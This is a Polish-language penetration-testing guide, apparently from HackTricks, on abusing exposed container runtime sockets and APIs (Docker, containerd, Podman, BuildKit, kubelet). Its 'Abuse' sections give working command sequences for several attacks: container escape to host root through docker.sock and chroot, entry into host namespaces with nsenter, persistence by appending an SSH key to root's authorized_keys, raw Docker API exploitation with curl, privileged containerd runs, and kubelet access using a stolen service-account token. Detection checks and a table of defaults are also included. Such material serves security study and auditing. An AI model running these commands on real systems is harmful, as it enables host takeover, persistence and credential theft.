# Ekspozycja Runtime API i daemonów

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od uzyskania dostępu do control plane runtime. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem przez zamontowany Unix socket albo wystawiony listener TCP, attacker może być w stanie zażądać utworzenia nowego kontenera z większymi uprawnieniami, zamontować filesystem hosta, dołączyć do namespace hosta lub pobrać wrażliwe informacje o nodzie. W takich przypadkach runtime API stanowi rzeczywistą granicę bezpieczeństwa, a jego compromise jest funkcjonalnie zbliżony do kompromitacji hosta.

Dlatego ekspozycję runtime socketu należy dokumentować oddzielnie od zabezpieczeń kernela. Kontener ze standardowym seccomp, capabilities i ograniczeniami MAC nadal może być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Izolacja kernela bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy management plane runtime pozostaje całkowicie exposed.

## Modele dostępu do daemonów

Docker Engine tradycyjnie udostępnia swoje uprzywilejowane API przez lokalny Unix socket pod adresem `unix:///var/run/docker.sock`. Historycznie był on również udostępniany zdalnie przez listenery TCP, takie jak `tcp://0.0.0.0:2375`, lub przez listener chroniony TLS na porcie `2376`. Zdalna ekspozycja daemona bez silnego TLS i uwierzytelniania klienta skutecznie zmienia Docker API w zdalny interfejs roota.

containerd, CRI-O, Podman i kubelet udostępniają podobne, istotne powierzchnie ataku. Nazwy i workflow różnią się, ale logika pozostaje taka sama. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, jest on uprzywilejowanym kanałem zarządzania i należy go odpowiednio traktować.

Typowe lokalne ścieżki, które warto sprawdzić, to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stacki mogą również udostępniać endpointy takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale po ich napotkaniu należy zachować taką samą ostrożność, ponieważ reprezentują powierzchnie kontroli runtime, a nie zwykłe sockety aplikacji.

## Bezpieczny zdalny dostęp

Jeśli daemon musi być udostępniony poza lokalnym socketem, połączenie powinno być chronione za pomocą TLS, a najlepiej również wzajemnego uwierzytelniania, tak aby daemon weryfikował klienta, a klient weryfikował daemon. Stary zwyczaj otwierania Docker daemon za pośrednictwem plain HTTP dla wygody jest jednym z najbardziej niebezpiecznych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco rozbudowana, aby bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczny wzorzec konfiguracji Docker wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja z daemonem może również występować jako `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket od systemd, zamiast samodzielnie go bindować. Najważniejszy wniosek nie dotyczy dokładnej składni, lecz konsekwencji dla bezpieczeństwa. W chwili, gdy daemon nasłuchuje poza lokalnym socketem o ściśle ograniczonych uprawnieniach, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalnym hardeningiem.

## Abuse

Jeśli socket runtime jest dostępny, sprawdź, który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest dostęp przez raw HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Te polecenia są przydatne, ponieważ pozwalają odróżnić nieistniejącą ścieżkę, zamontowany, ale niedostępny socket oraz aktywne uprzywilejowane API. Jeśli klient zadziała, kolejne pytanie brzmi, czy API może uruchomić nowy kontener z host bind mountem lub współdzieleniem przestrzeni nazw hosta.

### Gdy nie zainstalowano klienta

Brak `docker`, `podman` lub innego przyjaznego CLI nie oznacza, że socket jest bezpieczny. Docker Engine używa HTTP przez swój Unix socket, a Podman udostępnia zarówno API kompatybilne z Dockerem, jak i natywne API Libpod za pośrednictwem `podman system service`. Oznacza to, że minimalistyczne środowisko wyposażone tylko w `curl` może nadal wystarczyć do sterowania daemonem:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe client binaries, ale pozostawiają zamontowany management socket. Na hostach Podman należy pamiętać, że high-value path różni się w zależności od tego, czy wdrożenie jest rootful, czy rootless: `unix:///run/podman/podman.sock` dla rootful service instances oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla rootless.

### Pełny przykład: Docker Socket To Host Root

Jeśli `docker.sock` jest dostępny, klasyczna metoda escape polega na uruchomieniu nowego kontenera, który montuje główny system plików hosta, a następnie wykonaniu w nim `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Zapewnia to bezpośrednie wykonanie z uprawnieniami host-root za pośrednictwem Docker daemon. Wpływ nie ogranicza się do odczytu plików. Po wejściu do nowego kontenera attacker może modyfikować pliki hosta, pozyskiwać credentials, wdrażać persistence lub uruchamiać dodatkowe uprzywilejowane workloads.

### Full Example: Docker Socket To Host Namespaces

Jeśli attacker preferuje wejście do namespaces zamiast dostępu ograniczonego wyłącznie do filesystemu:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawną ekspozycją przestrzeni nazw hosta, zamiast wykorzystywać bieżący kontener.

### Docker Socket Persistence Pattern

Runtime control może być również używany do persistence zamiast jednorazowego shell. Ogólny schemat polega na utworzeniu pomocniczego kontenera z mountem hosta, zapisaniu materiału autoryzacyjnego lub startup hook do zamontowanego systemu plików hosta, a następnie zweryfikowaniu, czy host go wykorzystuje.

Przykładowy schemat:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ta sama idea może dotyczyć jednostek systemd, fragmentów cron, plików startowych aplikacji lub kluczy SSH, zależnie od tego, co operator chce udowodnić. Ważne jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień runtime daemon do systemu plików hosta, a nie przez dodatkowe uprawnienia w pierwotnym kontenerze.

### Raw Docker API Helper Pivot

Gdy brakuje Docker CLI, ten sam flow z helperem i mountem hosta można realizować przez HTTP za pośrednictwem Unix socket. Ogólny flow wygląda następująco: potwierdź API, utwórz helper container z bind mountem hosta, uruchom go, utwórz instancję exec i uruchom ten exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Końcowe żądanie `/exec/<id>/start` zależy od zwróconego identyfikatora exec, ale kwestia bezpieczeństwa jest niezależna od dokładnego sposobu obsługi JSON: bezpośredni dostęp do API rootful Docker daemon wystarczy, aby zażądać silniejszych uprawnień helper workload.

### Pełny przykład: Socket containerd

Zamontowany Socket `containerd` jest zazwyczaj równie niebezpieczny:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Jeśli dostępny jest klient bardziej zbliżony do Docker, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Skutkiem jest ponownie przejęcie hosta. Nawet jeśli brakuje narzędzi specyficznych dla Docker, inny runtime API może nadal zapewniać taką samą władzę administracyjną. Na węzłach Kubernetes `crictl` może również wystarczyć do rekonesansu i interakcji z kontenerami, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### BuildKit Socket

`buildkitd` łatwo przeoczyć, ponieważ często uważa się go za „tylko backend procesu build”, ale daemon nadal stanowi uprzywilejowaną płaszczyznę sterowania. Dostępny `buildkitd.sock` może pozwolić attackerowi na wykonywanie dowolnych kroków build, sprawdzanie możliwości workera, używanie lokalnych kontekstów z przejętego środowiska oraz żądanie niebezpiecznych entitlements, takich jak `network.host` lub `security.insecure`, jeśli daemon został skonfigurowany tak, aby na nie zezwalać.

Przydatne pierwsze interakcje to:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Jeśli daemon akceptuje żądania build, sprawdź, czy dostępne są niezabezpieczone entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Dokładny wpływ zależy od konfiguracji daemona, ale usługa BuildKit w trybie rootful z permissive entitlements nie jest nieszkodliwym udogodnieniem dla developerów. Traktuj ją jako kolejną administracyjną powierzchnię o wysokiej wartości, szczególnie na runnerach CI i współdzielonych węzłach buildów.

### Kubelet API Over TCP

Kubelet nie jest container runtime, ale nadal należy do płaszczyzny zarządzania węzłem i często jest uwzględniany w dyskusjach dotyczących tej samej granicy zaufania. Jeśli secure port kubeleta `10250` jest dostępny z workloadu albo ujawnione zostaną credentials węzła, kubeconfigi lub uprawnienia proxy, attacker może być w stanie wyliczyć Pods, pobierać logi lub wykonywać commands w kontenerach lokalnych dla węzła, bez konieczności przechodzenia przez ścieżkę admission Kubernetes API servera.

Zacznij od taniego discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Jeśli kubelet lub ścieżka proxy API-server autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do wykonania kodu w innych kontenerach na nodzie. Dlatego też `nodes/proxy` z wyłącznie uprawnieniem `get` jest bardziej niebezpieczne, niż mogłoby się wydawać: żądanie nadal może dotrzeć do endpointów kubelet, które wykonują polecenia, a te bezpośrednie interakcje z kubelet nie pojawiają się w standardowych logach audytu Kubernetes.

## Kontrole

Celem tych kontroli jest ustalenie, czy kontener może uzyskać dostęp do dowolnej płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Co jest tu interesujące:

- Zamontowany socket runtime jest zwykle bezpośrednim mechanizmem administracyjnym, a nie tylko źródłem ujawnienia informacji.
- Listener TCP na `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z runtime hosta.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa jako rootful | montowanie `/var/run/docker.sock`, wystawienie `tcp://...:2375`, słaby lub brak TLS na `2376` |
| Podman | Domyślnie bez daemon | Do zwykłego użytku lokalnego nie jest wymagany długotrwale działający uprzywilejowany daemon; API sockets mogą jednak zostać wystawione po włączeniu `podman system service` | wystawienie `podman.sock`, szeroki zakres działania service, rootful API use |
| containerd | Lokalny uprzywilejowany socket | Administrative API jest wystawiane przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, wystawianie uprzywilejowanych namespaces |
| CRI-O | Lokalny uprzywilejowany socket | CRI endpoint jest przeznaczony dla zaufanych komponentów lokalnych dla node'a | montowanie `crio.sock`, wystawienie CRI endpointu niezaufanym workloadom |
| Kubernetes kubelet | Lokalny dla node'a management API | Kubelet nie powinien być szeroko dostępny z Podów; dostęp może ujawniać stan Podów, credentials i funkcje wykonywania, zależnie od authn/authz | montowanie socketów lub certyfikatów kubeleta, słabe uwierzytelnianie kubeleta, host networking wraz z dostępnym endpointem kubeleta |

## Odnośniki

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
